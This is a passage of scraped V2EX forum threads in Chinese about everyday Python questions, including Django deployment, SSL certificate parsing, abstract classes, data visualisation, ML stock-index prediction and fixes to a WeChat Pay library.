["鼠标双击，复制到剪贴板", "# 生成 buffer 对象\r", "buf = PyMakeBuffer(length)\r", "print('get: ', SendMessage(hWnd, win32con.WM_GETTEXT, length, buf))\r", "address, length = PyGetBufferAddressAndLen(buf)\r", "text = PyGetString(address, length)\r", "print('text: ', text)", " 👍关于 buffer 的讨论搜索到的好少", "关于字符转换的另一个解决方案\r", "\r", "不要使用 Python 做这个工作", " 公司的客户端就是 python 写的，要实现这个需求。。。", " 你完全可以用另外的语言写一个模块甚至是编译个 exe 也可以，然后 Python 调用这个模块就好了。", " 你说这是个不错的办法～"]},
{"content": ["<div class=\"topic_content\">小弟有个 django web 项目，部署方式为 uwsgi + nginx 。需要在几十台机器上去挨个部署，并且能够自动更新版本（通过 shell 脚本更新）。 \r<br>\r<br>那么问题来了， django 只能采用源代码发布项目的方式发布吗？有没有一种类似于一键安装的方式？\r<br>如果没有的话，我就只能把项目打成 tar 压缩包，服务器上通过脚本进行解压缩，执行数据库同步（migrate）等操作。。。</div>"], "reply": "22", "tittle": "django 项目打包部署的正确姿势", "comment": ["docker ？", "virtuialenv+Git 或者 SVN 才是出路吧\r", "成熟的方案不用,强行造轮子把自己碾死的还少么", " 目前用的就是 virtualenv + git, 只不过我们目前的问题有两个，一个是并不是所有服务器都能随时进行 ssh （服务器在客户那边），另一个是 这个项目需要与其他几个功能上上相关的程序同时更新，需要引入版本号的概念。", " 版本号是公司内部自定义的，比如 1.5.3, 1.5.5 这种形式。并且能够支持回退。请问有什么建议吗？", "写个 makefile ？ 不过感觉和 shell 脚本差不多", "写个发布脚本是比较蠢的方式,如果用一些云服务比如阿里云的话这几十台可以直接利用服务的工具同步这几十台机器", " \r", "Git 和 svn 都是版本控制系统,都有版本的概念.\r", "Git 版本号管理上可能不如 svn 来得直观\r", "不能实实连过去手动更新是最好的\r", "写个脚本,定时访问 myweb.com/demo.json,确定是否需要更新,需要更新到的版本号.\r", "如果几十台服务器需求不一样,就根据每台机器的 mac 之类确定一个 ID.分别生成 mac1,2,3.json", " 已经有自动安装和部署的 shell 脚本，包括安装 nginx,uwsgi,git clone 代码，同步数据库，加入 supervisor 监控等。\r", "不过目前的问题再代码更新这一块，目前需要自己一台一台登录上去执行 git pull , 同步数据库等操作。而且始终是更新到最新的提交，目前要引入版本号的概念，就需要做到每次 git pull 到某个指定版本（ 1.4.5 ）", " 目前我也偏向于你这种思路。写脚本自动 git pull 。不过版本号怎么搞还不知道，像 1.5.3 ， 1.1.2 这种自定的版本号。用 git 的 tag 功能去实现吗？", " 没办法，我们的服务器是一台一台的实体机，并且安装在客户的机房里那种，而且有些客户不给我们远程 ssh 的权限。。。。", "我对 Git 不是很熟,我有一个比较笨的方法,把 Git 自动生成的版本号和公司自定义的版本在 json 里标示出来.\r", "比如 1a2b:1.5.3\r", "你叫我更新到 1.5.3 我脚本里直接 checkout 1a2b 不就好啦\r", "当然我觉得如果因为对 Git 不熟悉绕了路..还是比较萌蠢的", "git 有 webhook", "以前公司直接打包成 rpm 包", "Fabric?", " 好吧没有登录权限那就没办法了。不过全打包部署的话有一个已经基本死了的东西 ", " 可以把应用连同 virtualenv 打包成一个 tar, 直接解压就可以用。\r", "   我之前也是想做成这样的，但是遇到一个奇葩的 mysql 库的问题 _mysql.so  ， 好像是这个文件引起的， 把把应用连同 virtualenv 打包成一个 tar, 直接解压后， 总是会提示我没有权限使用这个文件。", "用 bitsync 或者 syncthing 做同步吧，修改代码后其他机器自动同步，版本管理直接交给 git 就行。", " 你是在 Windows 下打包的么？我记得 windows 会有这个问题", "既然 python 系的，基于 python 的 ansible 这么好用的部署神器就不能不推荐一把（当然， ansible 不仅仅能做部署，跟 puppet 、 chef 、 salt 是类别的）\r", "\r", "\r ", "#reply11           参见 11 楼", " 你这个“既然……就不能不”的道理，我没看出来啊", "我们这边用 docker 。虽然我觉得 virtualenv 也可以。。", " 意思就是相对 puppet 、 chef 这一类来说， ansible 遇到一些问题不需要 ruby 的知识\r", "\r", "我就这么一说，你也别当真 :smile:"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://tryolabs.com/blog/2016/12/20/top-10-python-libraries-of-2016/\" rel=\"nofollow\">https://tryolabs.com/blog/2016/12/20/top-10-python-libraries-of-2016/</a></div>"], "reply": "目前尚无回", "tittle": "Top 10 Python libraries of 2016", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>自己学习 python 动手做了 gui 的小程序，问题如下：\n登录某网站进去后，怎么免登录打开指定的网址呢？登陆的时候要设置 http 的 header 中的 cookie 。\n我试过 python 自带的 webbrowser 不能行（不能设置 cookie 吧？）</p>\n<p>btw:\n我看了某些应用，如：心蓝订票助手和 12306bypass 里面有个免登录打开 12306 ，所以我想试试 python 有没有类似的</p>\n<p>各位 V 友，有了解的麻烦指点一二，谢谢了</p>\n</div></div>"], "reply": "16", "tittle": "请教一个关于 python 的 GUI 问题", "comment": ["别沉呀。", "这和 GUI 有啥关系…一件懵逼", "这个只有把 webbrowser 换了才行吧", " 就是想实现这样的功能·", " 有第三方的包么？", " Selenium?", "可以写一个爬虫自动登录吗？用 requests", "改用 pyQt?", " 这个我有试过，貌似要先预装相关的浏览器才行，而且体验很不好，打开有延迟的。", " 要看那个网站登录模块有没有做什么限制，比如：验证码之类的", " pyQt 没用过，我现在是用 wxpython 写的", "我看 心蓝订票助手和 12306bypass 还有其他某些软件登录进去直接能打开某地址（应该是设置了 cookie 之类的）。\r", "不知道 C#是如何设置此类操作的", "你的意思是在 gui 界面中登陆之后再打开外部浏览器 ？", " 是的，就是打开系统浏览器", "打开外部浏览器的时候只能传递 url ，不能传递 cookie 。有一些网站网站支持在 url 中携带登陆信息（比如 QQ 空间之类的），这种网站就可以做到你说的“免登录”。估计你说的那个什么助手也是用的这个方法。\r", "\r", "除了上面这种方法之外还有一些高级方法，就看你肯不肯花时间去做了。\r", "\r", "方法一：\r", "修改浏览器的 cookie 文件，把指定网站的 cookie 写进去，然后让浏览器去读取。当然如果浏览器有这种 api 的话最好。\r", "（我曾经读取过 chrome 的 cookie 文件，但没有修改过，所以你要自己去试一下）\r", "\r", "方法二：\r", "用 Python 搭建一个小型的代理服务器，把要打开的外部链接作为参数传递到代理服务器上。比如你要打开 ", " ，你的代理服务器是 127.0.0.1 。那么你最终传递给浏览器的链接就是 ", " （这里只是举个例子）。浏览器打开这个链接的时候会首先访问我们的代理服务器，代理服务器在接到这个链接的时候把 ", " 的 cookie 传递给浏览器。然后我们再在代理服务器上做一个跳转，让浏览器跳转到 ", " 上去就行了。这样浏览器访问 ", " 的时候就会携带上我们传递给它的 cookie 。\r", "（这种方法稍微有点复杂，不知道你看懂没有）", " 谢谢回复，方法一我可以尝试下，方法二的话确实复杂了，不折腾了。"]},
{"content": ["<div class=\"topic_content\">经过和坛子里的朋友友好讨论以后，我决定还是把样本按照时间序列切除一下，把最后 100~228 行数据拿出来不放在训练和测试集里分割，做一个样本外测试集来 score 一下比较比较模型效果，看看这样做了以后，我们 3 个模型的表现。\r<br>\r<br>\r<br>先来三发帖子回顾：\r<br>\r<br>使用 SVM 预测大盘涨跌： <a target=\"_blank\" href=\"https://uqer.io/community/share/584f652f6740ec004f2bd542\" rel=\"nofollow\">https://uqer.io/community/share/584f652f6740ec004f2bd542</a>\r<br>使用决策树预测大盘涨跌： <a target=\"_blank\" href=\"https://uqer.io/community/share/5853f6bd954fa20047b771e3\" rel=\"nofollow\">https://uqer.io/community/share/5853f6bd954fa20047b771e3</a>\r<br>使用 Adaboost 预测大盘涨跌： <a target=\"_blank\" href=\"https://uqer.io/community/share/58541c566a5e6d0051dc33f5\" rel=\"nofollow\">https://uqer.io/community/share/58541c566a5e6d0051dc33f5</a>\r<br>\r<br>\r<br>\r<br>\r<br>测试模型稳健性的结果发现，只剩下决策树这个最简单的模型表现得还稳健一些了（果然简简单单才是真吗？），然而对样本外测试的准确率也从对样本内测试的 0.9 跌到了 0.8 左右。而 adaboost 和 SVM 的预测准确率就在那里上下波动，上下波动……一点都不听话。\r<br>\r<br>为啥 adaboost 和 SVM 在那里光波动不听话呢？它光不听话也就算了。它不光不听话，预测准确率还很有规律地要么高，要么低，也不是单纯地上下摆动。而且预测准确率极低的时候吧，和决策树对比，准确率相加恰好为 1 ，为毛相加以后准确率恰好为 1 呢？这到底是为什么呢？我怎么想都想不明白。\r<br>\r<br>哎呀好气啊。：（\r<br>\r<br>\r<br>查看完整源代码请戳： <a target=\"_blank\" href=\"https://uqer.io/community/share/58557c8a954fa20050b77496\" rel=\"nofollow\">https://uqer.io/community/share/58557c8a954fa20050b77496</a>\r<br>\r<br>\r<br>根据论坛里朋友的建议，我按照时间周期重新生成了 3 个数据集，训练集，测试集，周期后测试集，来共同判断准确率。\r<br>\r<br>我选用前 1900 个数据分割训练集和测试集， 1900 个数据的时间点以后的 328 来个数据预留出来，用来做时间周期后测试。\r<br>\r<br>接下来先来比较 adaboost 的，然后是决策树的，最后是 SVM 的。\r<br>\r<br>\r<br>神奇的事情发生了……在时间点以后的数据的预测上，决策树的准确率是 0.21 ，与其他两个模型形成了鲜明对比……\r<br>啊不对， 0.21+0.79 = 1 ，有可能， SVM 的预测在时间点的最后 300 来个数据上，恰好和另外两个模型相反了。\r<br>看来我又得调用参数重要性图了……\r<br>\r<br>\r<br>\r<br>不对！ SVM 哪来的参数重要性图啊？\r<br>\r<br>adaboost 和决策树的确有参数重要性这一说， SVM 是投射到高维平面上进行切割，何来参数重要性一说呢？生成 SVM 的参数重要性这件事，臣妾做不到啊……\r<br>\r<br>只能过猜了， SVM 的预测，在最后这 300 来个样本外数据上，加起来得 1 ，有很大的可能，是因为与另外两个模型的预测恰好相反，也有可能，只是凑巧了，这个准确率次为 0.21 只是瞎猫碰到死耗子了。为了验证，咱这次稍微改改数据集，把时间参数点的位置稍微调一下，重新跑一下模型再测测吧……\r<br>\r<br>这次又是样本外数据相加为 1 了……但是……等一下！现在不站队的是 adaboost 了！ SVM 和决策树预测准确率比样本内还高了！这不科学……\r<br>\r<br>看来这是逼我画图啊，好吧。\r<br>\r<br>\r<br>\r<br>对 AdaBoost 画图了以后，发现以下几个现象：\r<br>\r<br>1 、准确率随着训练集数量的增加趋于稳定。\r<br>2 、准确率要么很高，要么很低，几乎不在中间停留。\r<br>3 、准确率在对最后一个数据的预测为 0\r<br>为了进一步猜测，接下来我把 3 个模型的预测准确率图都画出来吧……\r<br>\r<br>\r<br>横坐标数量表示目前我们样本内数据是前多少个数据。\r<br>\r<br>发现一个有趣的事，对于时间点以后的数据， SVM （绿线）和决策树表现的曲线差不多，中间有微小波动，其中 SVM 线一直是平滑变动，在样本内数据达到 2100 个（样本外数据只剩最后 28 个）时， SVM 的预测能力开始缓慢下降，渐渐达到了接近 0.2 这个极低的准确率，然后又在最后一个数据的时候准确率变动到了 100%……我认为这时候应该是大盘指数的表现恰好和 30 天前的数值上下波动，由于我们的判断就是简单的 30 个交易日以后的收盘指数是否大于今天的收盘指数，所以当指数小幅波动，一会儿超过 30 天前的，一下又大于 30 天前的时候，模型预测就没啥意义了。更改方式很简单，在预测的时候，定一个阈值，必须超过之前指数加上这个阈值，设定 True ，低于这个指数减去阈值，设定 False ，否则设定 None 就好。\r<br>\r<br>顺便说一下……鉴于上面说的哪个没有加阈值的，脑残的 True ， False 设定，所以单独测试一天的准确率是毫无意义的。必须测定一段周期内的准确率，所以可以认为最后那几个突然变动的线可以抹去了。\r<br>既然这样的话，那我就设定预留至少 100 个数据，这样增加计算准确率的可靠性，以防最后的因为数据太小准确率突变，再生成一次图。\r<br>\r<br>\r<br>这次我们发现：\r<br>\r<br>1 、对于样本外数据，决策树的表现持续不错，最低也有 0.78 ，没有剧烈震动。甚至随着数据集的增加，对样本外数据的预测还略微增加了。\r<br>2 、 SVM 和 AdaBoost_score 就不行了，震动很剧烈。\r<br>3 、 SVM 和 AdaBoost_score 在每次变化两个数据的情况下， score 的变化是要么和决策树的判断相同，要么相反。希望有兴趣的朋友可以讨论一下这到底是为什么。\r<br>4 、目前来看，要预测大盘指数是可行的，在比较的 3 个模型中，决策树还是更靠谱点的。\r<br>5 、使用的样本外数据是分割的样本时间点以后， 100~228 个数据进行的 score 。有兴趣的朋友可以切割得更久远一些，也就是说模型不光预测未来短期内的数据，试试预测未来长时间的涨跌准确率。个人倾向于认为市场上的重要性因子会随着时间变化，需要定期更新模型，当然，也不排除有一些重要性因子是始终辣么重要的……有兴趣的朋友可以在数据提取的时候，选择一个更长周期的数据，中间切割个几百天，让样本外数据距离测试数据的距离更远，然后再试试不同模型的预测准确率。本人这里只试验了 3 个模型，当抛砖引玉吧。\r<br>\r<br>\r<br>最后我又按照周期， 100 天为单位，预测准确率，发现随着时间节点的改变，准确率的变化如图所示。\r<br>看来预测大盘这事跟时间周期确实有很大的关系啊。\r<br>\r<br>\r<br>查看完整源代码请戳： <a target=\"_blank\" href=\"https://uqer.io/community/share/58557c8a954fa20050b77496\" rel=\"nofollow\">https://uqer.io/community/share/58557c8a954fa20050b77496</a></div>"], "reply": "2", "tittle": "重新比较 SVM，决策树以及 Adaboost 模型预测大盘准确率", "comment": ["预测大盘指数是可行的？ 别逗。", " 比掷骰子强：）"]},
{"content": ["<div class=\"topic_content\">新人刚在自学 python ，语法刚刷几遍，目前在尝试一些小项目。现在遇到一个问题，想实现从网站提供的 api 接口获取的数据，对其中部分数据实现数据可视化，从而能否监控其数据变动。想请老手指点一下学习及实现的路径，感激不尽。如下是获取的数据类型，主要是想统计每天的数据变化，并生成柱状图或者曲线图。\r<br>\r<br>[\r<br>\t{\r<br>\t\t\"id\": \"bitcoin\", \r<br>\t\t\"name\": \"Bitcoin\", \r<br>\t\t\"symbol\": \"BTC\", \r<br>\t\t\"rank\": \"1\", \r<br>\t\t\"price_usd\": \"573.137\", \r<br>\t\t\"price_btc\": \"1.0\", \r<br>\t\t\"24h_volume_usd\": \"72855700.0\", \r<br>\t\t\"market_cap_usd\": \"9080883500.0\", \r<br>\t\t\"available_supply\": \"15844176.0\", \r<br>\t\t\"total_supply\": \"15844176.0\", \r<br>\t\t\"percent_change_1h\": \"0.04\", \r<br>\t\t\"percent_change_24h\": \"-0.3\", \r<br>\t\t\"percent_change_7d\": \"-0.57\", \r<br>\t\t\"last_updated\": \"1472762067\"\r<br>\t}, \r<br>\t{\r<br>\t\t\"id\": \"ethereum\", \r<br>\t\t\"name\": \"Ethereum\", \r<br>\t\t\"symbol\": \"ETH\", \r<br>\t\t\"rank\": \"2\", \r<br>\t\t\"price_usd\": \"12.1844\", \r<br>\t\t\"price_btc\": \"0.021262\", \r<br>\t\t\"24h_volume_usd\": \"24085900.0\", \r<br>\t\t\"market_cap_usd\": \"1018098455.0\", \r<br>\t\t\"available_supply\": \"83557537.0\", \r<br>\t\t\"total_supply\": \"83557537.0\", \r<br>\t\t\"percent_change_1h\": \"-0.58\", \r<br>\t\t\"percent_change_24h\": \"6.34\", \r<br>\t\t\"percent_change_7d\": \"8.59\", \r<br>\t\t\"last_updated\": \"1472762062\"\r<br>\t}, \r<br>\t...\r<br>]</div>"], "reply": "9", "tittle": "请教关于 python 获取的 API 数据如何数据可视化？", "comment": ["有专门做数据可视化服务的\r", "\r", "比如这个", "bokeh", "d3.js", "plotly ", "\r", "\r", "不过还是 c3.js 方便一点吧。", "原生 python 的话推荐你用 Matplotlib ，如果是 web 的话，百度的 echarts 够你玩的了", " ， Matplotlib 是可以实现可视化，我从 API 获取的数据是否需要导入数据库保存及提取", "python highcharts", "from pprint import pprint\r", "pprint(data)", "晕,请无视."]},
{"content": ["<div class=\"topic_content\">随便逛了逛，发现 V 友们还是很喜欢看干货合集类型的帖子的。有很多同事以前都是程序员出身，在工作过程中学习量化策略，到现在已经可以独立撰写研报啦！想学习量化的人千万不要气馁，我们一同摸索！ \r<br>\r<br>这里提供一些资源供大家浏览。 \r<br>\r<br>学量化投资 step 1 ：买入卖出： <a target=\"_blank\" href=\"https://uqer.io/community/share/56fa3ef0228e5b887ce50e04\" rel=\"nofollow\">https://uqer.io/community/share/56fa3ef0228e5b887ce50e04</a>\r<br>\r<br>学量化投资 step 2 ：指价建仓： <a target=\"_blank\" href=\"https://uqer.io/community/share/56fa4081228e5b8886e510e2\" rel=\"nofollow\">https://uqer.io/community/share/56fa4081228e5b8886e510e2</a>\r<br>\r<br>学量化投资 step 3 ：区间内低买高卖： <a target=\"_blank\" href=\"https://uqer.io/community/share/56fabc58228e5b8887e51001\" rel=\"nofollow\">https://uqer.io/community/share/56fabc58228e5b8887e51001</a>\r<br>\r<br>学量化投资 step 4 ：分析收益率自动追涨： <a target=\"_blank\" href=\"https://uqer.io/community/share/56fbb4dd228e5b1f861a8e14\" rel=\"nofollow\">https://uqer.io/community/share/56fbb4dd228e5b1f861a8e14</a>\r<br>\r<br>学量化投资 step 5 ：移动平均线之金叉和死叉： <a target=\"_blank\" href=\"https://uqer.io/community/share/56fbec69228e5b1f8a1a8eb0\" rel=\"nofollow\">https://uqer.io/community/share/56fbec69228e5b1f8a1a8eb0</a>\r<br>\r<br>学量化投资 step 6 ：成交量之缩量增量： <a target=\"_blank\" href=\"https://uqer.io/community/share/57028067228e5b4903eb3fd3\" rel=\"nofollow\">https://uqer.io/community/share/57028067228e5b4903eb3fd3</a>\r<br>\r<br>学量化投资 step 7 ：量价八阶律的简单实现： <a target=\"_blank\" href=\"https://uqer.io/community/share/57124fae228e5b827e7f5491\" rel=\"nofollow\">https://uqer.io/community/share/57124fae228e5b827e7f5491</a>\r<br>\r<br>\r<br>Core practice ： Python 程序员的 10 个常见错误： <a target=\"_blank\" href=\"https://uqer.io/community/share/57218746228e5b633c7b93ee\" rel=\"nofollow\">https://uqer.io/community/share/57218746228e5b633c7b93ee</a></div>"], "reply": "3", "tittle": "From 程序员 to 量化， How？", "comment": ["thanks", "其中量化最大的困难，不是不懂这些技术，而且由于某些不能说的原因，国内完全不对个人开放股票的交易 API...\r", "\r", "然后量化就变成屠龙之技了", " 是的，之前华宝、华泰开了现在又关了，现在程序化通道也基本只对机构放开。不过量化不等同于程序化啦，量化其实可以叫做科学的投资方法，强调风险跟收益的可解释性，这也是这么多理工科从事量化的原因。"]},
{"content": ["<div class=\"topic_content\">现在有一堆 SSL 证书，需要提取其中的 Issuer 、 Subject 等信息吧，就是 windows 下双击这个证书里能看到的颁发者、使用时间啥的。之前用 C#的 System.Security.Cryptography.X509Certificates 包来做的，现在开发环境换 python 了，也没找到比较好用的库。\r<br>\r<br>求老司机引导一下……</div>", "<div class=\"topic_content\">补充一下， SSL 证书都是离线的，不能再次与远程站点建立连接。</div>"], "reply": "9", "tittle": "如何用 Python 解析 ssl 证书文件？", "comment": ["好像自带库里有，没用过，我也不清楚，帮", ", 现找的，希望 LZ 喜欢", "PyOpenSSL\r", "\r", "OpenSSL.SSL.Connection()\r", "get_peer_certificate()\r", "get_peer_cert_chain()", "import os\r", "os.system(\"openssl x509 -text -noout -in cert.crt\")", " 我喜欢这个方式。", " \r", " 简单粗暴", " 啊这也能叫用 python 来解决……你赢了", " 感谢。我没有说清楚，证书是离线的，无法再次与服务器建立连接。\r", "已补充到题目。", "好，自问自答一波\r", "\r", "使用 pyOpenSSL:\r", "\r", "OpenSSL.crypto.load_certificate(type, buffer)\r", "get_subject()\r", "get_issuer()"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>遇到个例子</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>phonebook<br>\n{'Alice': '2341', 'Beth': '9102', 'Cecil': '3258'}<br>\n\"Cecil's phone number is %(Cecil)s.\" % phonebook<br>\n\"Cecil's phone number is 3258.\"\n原文如下：\n在每个转换（ conversion specifier ）中的 % 字符后面，可以加上用圆括号括起来的键，后面再跟上其他说明元素。</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<p>这段有点看不懂，自己理解</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>\"%（ k ） s\"%d\n'v'\n这里的%和 s 代表什么意思？</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</div></div>"], "reply": "4", "tittle": "字典表的%字符问题", "comment": ["关键词： Python 字符串 格式化", "\"Cecil's phone number is %s.\" % phonebook[Cecil]  # 这样会不会更好理解一点", " get 到一点了，不过 @", " 给了关键词，我还是查查", " 马上去查查"]},
{"content": ["<div class=\"topic_content\">有个类，在子进程里到处被 import ，要求子进程里创建的实例始终为同一个，但不同的子进程里的实例不一样，请教各位大神如何解决？</div>"], "reply": "5", "tittle": "小白请教各位大神一个关于单例模式的问题", "comment": ["都不同进程了，除非写__getstate__方法用来 pickle ，否则没法搞", "这已经不是单例模式做的事了,参考进程共享数据把\r", "简单可以用外置数据,非要 python 单例对象的话,可以试试代理对象", " \r", " \r", "可能我表述没到位，我不需要跨进程的单例，我需要的是跨模块的单例\r", "我照着 stackoverflow 的例子实现了一个装饰器，但是每次在别的模块里 import 之后，装饰器用来保存实例的字典就重置了……\r", "开始怀疑自己的思路是不是跑偏了=。=", "代码贴出来呗", " \r", " \r", " \r", "用 pickle 测试了一下，目前来看是可行的，不过我遇到一个问题，当我用装饰器包装类的时候，这个类就不能被 pickle 序列化了，会报 can ‘ t pickle class x.y it's not the same object as x.y"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>简介</h2>\n<p>一款简易的 restapi 开发脚手架。服务端采用 flask ， orm 使用 peewee ，表单使用 wtform 。都是轻量级框架，简单易学。实现自定义查询、表单保存，模型数据序列化， APIMethodView （ curd 操作）等。主要是实现下面好玩的查询 API ，<a href=\"http://postgrest.com/api/reading/\" rel=\"nofollow\">API 格式参考</a>。</p>\n<p>##查询 API</p>\n<pre><code>&gt; curl http://127.0.0.1:5000/authors\n{\"status\": {\"message\": \"200 OK\", \"code\": 0}, \"data\": {\"count\": 0, \"items\": [], \"limit\": 10, \"page\": 1, \"max_page\": 0}}\n# 查询年龄大于 25 的作者\n&gt; curl http://127.0.0.1:5000/authors?age=gt.25\n# 查询姓名包含 dracarys 的作者\n&gt; curl http://127.0.0.1:5000/authors?name=like.dracarys\n# 仅仅返回作者 ID\n&gt; curl http://127.0.0.1:5000/authors?select=id\n</code></pre>\n<p>项目地址： <a href=\"https://github.com/dracarysX/flask_restapi\" rel=\"nofollow\">https://github.com/dracarysX/flask_restapi</a>  有兴趣的可以一起交流。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "一款基于 Flask 开发 restAPI 的脚手架", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近学习 python ，被各种实例方法，类方法，静态方法，抽象方法弄的有点懵。这么多方法各自的应用场景是什么呢？</p>\n<p>一个抽象类中(metaclass=ABCMeta)，所有的方法是否必须为抽象方法呢？看了帮助文档和网上的一些资料没怎么弄明白</p>\n<p>先谢过了，&gt;_&lt;</p>\n</div></div>"], "reply": "15", "tittle": "请教 python 中抽象类和抽象方法相关问题", "comment": ["不知道 “抽象类” 这个名字从哪里听来的，似乎没听过这个叫法，而且这个叫法不但不形象还很误导。\r", "metaclass 有点黑魔法的味道，知道 metaclass 做什么的，能看到 metaclass 的代码就可以。实际应用中自己写 metaclass 实现的机会非常少（你可以简单的认为用不到）。\r", "\r", "metaclass 简单的说就是以一个类为模板，生成一个全新的类。\r", "实在想详细了解还是老老实实的看文档\r", "A class that has a metaclass derived from ABCMeta cannot be instantiated unless all of its abstract methods and properties are overridden.\r", "metaclass 又不是抽象类。抽象类在 python 里面是 abc 。", "import abc", "自己查文档怎么用。", "不理解什么是抽象类，什么是类方法什么的，不是 python 的问题，是你理论不行，无关乎语言问题。", "至于 metaclass 是什么，我也不知道怎么说，百度去吧。别人的教程总会比我讲得好。", "我在 python cookbook 一书了解的抽象类, 它用来继承使用, 不能直接实例化, collections.defaultDict, collections.OrderedDict, collections.Counter 等, 都是抽象类, 继承后就拥有它们的特性了,, 优点 重用代码", "  嗯，我也看了这本书，文档中有这样一段话：\r", ".abstractmethod \r", "A decorator indicating abstract methods.\r", "Using this decorator requires that the class ’ s metaclass is ABCMeta or is derived from it.\r", "\r", "\r", "但是如下代码运行没有问题：\r", "\r", "```python\r", "\r", "from abc import ABCMeta, abstractmethod\r", "\r", "class Shape(object):\r", "    \r", "    @", "\r", "    def area(self):\r", "        pass\r", "        \r", "    def __lt__(self, obj):\r", "        return self.area() < obj.area()\r", "    \r", "    def __eq__(self, obj):\r", "        return self.area() == obj.area()\r", "\r", "\r", "class Rectangle(Shape):\r", "    def __init__(self, w, h):\r", "        self.w = w\r", "        self.h = h\r", "        \r", "    def area(self):\r", "        return self.w * self.h\r", "    \r", "\r", "if __name__ == \"__main__\":\r", "    r1 = Rectangle(2, 3)\r", "    r2 = Rectangle(2, 4)\r", "    print(r1 < r2)\r", "\r", "```\r", "\r", "\r", "如下代码也没有问题\r", "\r", "``` python\r", "from abc import ABCMeta, abstractmethod\r", "\r", "class Shape(metaclass=ABCMeta):\r", "    \r", "    @", "\r", "    def area(self):\r", "        pass\r", "        \r", "    def __lt__(self, obj):\r", "        return self.area() < obj.area()\r", "    \r", "    def __eq__(self, obj):\r", "        return self.area() == obj.area()\r", "\r", "\r", "class Rectangle(Shape):\r", "    def __init__(self, w, h):\r", "        self.w = w\r", "        self.h = h\r", "        \r", "    def area(self):\r", "        return self.w * self.h\r", "    \r", "\r", "if __name__ == \"__main__\":\r", "    r1 = Rectangle(2, 3)\r", "    r2 = Rectangle(2, 4)\r", "    print(r1 < r2)\r", "```", "应该是想问类方法（ classmethod ）/静态方法（ staticmethod ）/实例方法吧", " 不是，是 ABCMeta 和 abstractmethod", "和 Java 的接口和 c 艹的纯虚函数一样…楼主可以面向对象的编程范式", " 嗯，谢谢指教！目前只是学了 python ，对你说的不大懂，有资料推荐么？", " \r", "\r", "不用急，慢慢学 Python\r", "也可以试试学学 Java\r", "Java 相对 Python 来说更加面向对象\r", "\r", "楼主是大学？", " 读研中，只不过不是计算机专业的，想转行~_~", " \r", "\r", "学学写代码倒是不难，\r", "但是要学好计算机科学还是挺麻烦的。\r", "\r", "我也不知道楼主什么专业…所以不做评论…", " 嗯嗯，越学越觉得不容易，并不是像想象的那么简单。现在还没有想去学好计算机科学（也不知道计算机科学有多广泛），现在暂时想学好 python ，满足行业要求而已。", " \r", "\r", "话说要是真的需要建议的话，\r", "强烈建议楼主把英语数学学好…\r", "\r", "英语查资料看文档看 GitHub\r", "数学写算法写数据结构\r", "\r", "然后就是什么鬼编译原理什么鬼计算机网络什么鬼操作系统了", " 谢谢，目前正在学英语，:)"]},
{"content": ["<div class=\"topic_content\">在任意一个模块中，用 from ... import ... 导入的成员，当模块被其它地方引用时，用 from ... import ... 会暴露原始类 from import 的成员，有什么办法限制吗？\r<br>\r<br>__all__ 对这个情况无效。</div>"], "reply": "2", "tittle": "Python 用 from ... import ... 导入的问题", "comment": ["del 可以", "变量名前加一个下划线可以避免被`import`"]},
{"content": ["<div class=\"topic_content\">这个模型的思路就是利用历史月度数据建立分类器，选取了大概 20 个因子（继续加也没问题），然后以月度收益大于 25%的作为强势股+1 小于-10%的为弱势股-1 （这里用绝对强度而不是相对强度） 用得到的数据用 Logistic 模型训练，每过一期就把每个月的数据直接加到训练集里面，当然用滚动窗口训练也没问题（懒得做） 我也尝试过用 svm 分类，但是实际上效果并不好，据我做机器学习的同学表示， svm 在特征不够好的情况下 表现确实是还不如 logistic 模型的，这种二分类而因子模型本身不太可能做到样本外 80%以上的 AUC ，那太夸张了，所以似乎是 logistic 会好点，决策树我没试过 或者用 adaboost 或者随机森林什么的。 \r<br>\r<br>当然模型还是有一点我想了很多办法也没法改进的问题： \r<br>1.首先，模型在市场风格急剧变化的情况下表现较差 在这里 牛熊变化的关口表现不好 波动性大 15 年股灾的的时候回测有差不多 45% 我本来想加个择时控制仓位的因子进去，但是怎么也选不好。\r<br> \r<br>2.对 1 里面的问题我还有一个思路，如果用随机梯度递减的算法是不是能较快反应出市场变化呢？不过这样的话训练集似乎太少了。\r<br> \r<br>3.可能会有点过拟合，但是并不会很明显，我改变参数回测了好几次，夏普比率都在 1 左右，最低也有 0.8 4.机器学习方法的通病就是逻辑性的不足，这里虽然是线性模型，也有一定这样的问题。 \r<br>\r<br>总之这个模型还算稳定，基本上每年都可以获得超额收益，大家可以一起讨论改进。 \r<br>\r<br>\r<br>完整高清源代码请移步这里： <a target=\"_blank\" href=\"https://uqer.io/community/share/5763ad63228e5b8199a55ebc\" rel=\"nofollow\">https://uqer.io/community/share/5763ad63228e5b8199a55ebc</a>\r<br>\r<br>\r<br>大家有什么看法都可以看过之后在下方留言讨论哟～乐意与大家尽情讨论！比心：）</div>"], "reply": "目前尚无回", "tittle": "如何简单的利用 Logistic 训练的因子模型使得年化超额 alpha 超过 20%，最大年化收益率高达 34.2%！", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看到 V2EX 上面有关于微信支付的开源项目 <a href=\"https://www.v2ex.com/t/329136\" rel=\"nofollow\">开源我公司微信支付 python 版本的全部代码...</a>，\n细看源码后发现此项目 fork 我的老项目 zakzou/flask-weixin-pay ，所以继承了一些老问题</p>\n<ol>\n<li><code>jsapi</code> 里面的 timestamp 为整型，在 ios 系统里面调起 api 有问题</li>\n<li><code>download_bill</code> 里面的 bill_type 的必填，另外返回内容存在是文本而非 xml ，所以不能转换为 dict</li>\n<li><code>refund</code> 需要证书</li>\n</ol>\n<p>以上问题都已经在 <a href=\"https://github.com/zwczou/weixin-python/blob/master/weixin/pay.py\" rel=\"nofollow\">zwczou/weixin-python</a> 里面修复</p>\n<p>另外 Jolly23/wx_pay_python 又新产生的问题</p>\n<ol>\n<li><code>unified_order</code> 里面的 user_ip 应为 spbill_create_ip ，导致误判 flask ，另外 nonce_str 